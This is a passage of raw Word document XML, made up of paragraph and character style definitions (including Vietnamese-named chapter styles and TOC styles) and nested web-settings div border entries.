  <w:style w:type="numbering" w:customStyle="1" w:styleId="Style1">
    <w:name w:val="Style1"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="6"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DCCT-UL2">
    <w:name w:val="DCCT-UL2"/>
    <w:basedOn w:val="DCCT-Level2"/>
    <w:next w:val="DCCT-Level1"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DCCT-Level4">
    <w:name w:val="DCCT-Level4"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="3"/>
        <w:numId w:val="7"/>
      </w:numPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DCCT-Body">
    <w:name w:val="DCCT-Body"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
      <w:ind w:firstLine="709"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:spacing w:before="480" w:after="0" w:line="276" w:lineRule="auto"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
      <w:kern w:val="0"/>
      <w:sz w:val="28"/>
      <w:lang w:eastAsia="ja-JP"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="UH1">
    <w:name w:val="UH1"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:spacing w:after="360" w:line="312" w:lineRule="auto"/>
      <w:ind w:right="567"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Angsana New"/>
      <w:caps/>
      <w:kern w:val="0"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="35"/>
      <w:lang w:val="en-AU" w:eastAsia="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle01">
    <w:name w:val="fontstyle01"/>
    <w:rsid w:val="002E323F"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="default"/>
      <w:b/>
      <w:bCs/>
      <w:i w:val="0"/>
      <w:iCs w:val="0"/>
      <w:color w:val="000000"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle21">
    <w:name w:val="fontstyle21"/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="default"/>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:i w:val="0"/>
      <w:iCs w:val="0"/>
      <w:color w:val="000000"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="longtext">
    <w:name w:val="long_text"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F30F59"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ChngmcL1">
    <w:name w:val="Chương mục. L1"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="8"/>
      </w:numPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="0"/>
      <w:contextualSpacing/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="DengXian" w:cs="Times New Roman"/>
      <w:i/>
      <w:kern w:val="0"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="ChngmcL2">
    <w:name w:val="Chương mục. L2"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="ChngmcL2Char"/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="8"/>
      </w:numPr>
      <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      <w:contextualSpacing/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="DengXian" w:cs="Times New Roman"/>
      <w:kern w:val="0"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ChngmcL2Char">
    <w:name w:val="Chương mục. L2 Char"/>
    <w:link w:val="ChngmcL2"/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="DengXian" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:kern w:val="0"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="22"/>
      <w:lang w:eastAsia="zh-CN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle31">
    <w:name w:val="fontstyle31"/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial" w:hint="default"/>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:i w:val="0"/>
      <w:iCs w:val="0"/>
      <w:color w:val="000000"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="100" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="88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F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="100" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="110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F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="100" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="132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F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="100" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="154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F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="100" w:line="276" w:lineRule="auto"/>
      <w:ind w:left="1760"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:kern w:val="0"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="UnresolvedMention1">
    <w:name w:val="Unresolved Mention1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:color w:val="800080" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Bang">
    <w:name w:val="Bang"/>
    <w:basedOn w:val="Caption"/>
    <w:link w:val="BangChar"/>
    <w:autoRedefine/>
    <w:qFormat/>
    <w:rsid w:val="00F30F59"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="312" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:kern w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CaptionChar">
    <w:name w:val="Caption Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Caption"/>
    <w:uiPriority w:val="35"/>
    <w:rsid w:val="00F440BB"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:bCs/>
      <w:i/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BangChar">
    <w:name w:val="Bang Char"/>
    <w:basedOn w:val="CaptionChar"/>
    <w:link w:val="Bang"/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:b w:val="0"/>
      <w:bCs/>
      <w:i/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="PageNumber">
    <w:name w:val="page number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F30F59"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00F30F59"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Calibri" w:hAnsi="Times New Roman" w:cs="Cordia New"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="0"/>
      <w:szCs w:val="25"/>
      <w:lang w:val="en-AU" w:bidi="th-TH"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ListParagraphChar">
    <w:name w:val="List Paragraph Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="ListParagraph"/>
    <w:uiPriority w:val="34"/>
    <w:rsid w:val="00301F13"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00790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6791">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="46690485">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="142892464">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="234094678">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="303514108">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="318464111">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="379213659">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="398407205">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="573852973">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="685208546">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="701634438">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="718431695">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="787967482">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="822239392">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="901908832">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1046950915">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1050031336">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1097798527">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1181435214">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1211307675">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1230731963">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="251352749">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
            <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
            <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
            <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1263370233">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1256592034">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                    <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                    <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                    <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="1832335306">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                        <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                        <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1693997152">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="single" w:sz="2" w:space="0" w:color="auto"/>
                            <w:left w:val="single" w:sz="2" w:space="0" w:color="auto"/>
                            <w:bottom w:val="single" w:sz="6" w:space="0" w:color="auto"/>
                            <w:right w:val="single" w:sz="2" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="159354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731411">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                    <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                    <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                    <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="131793835">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                        <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                        <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                        <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="1780175191">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                            <w:left w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                            <w:bottom w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                            <w:right w:val="single" w:sz="2" w:space="0" w:color="D9D9E3"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="638461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6282140">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1399748911">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1416130148">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
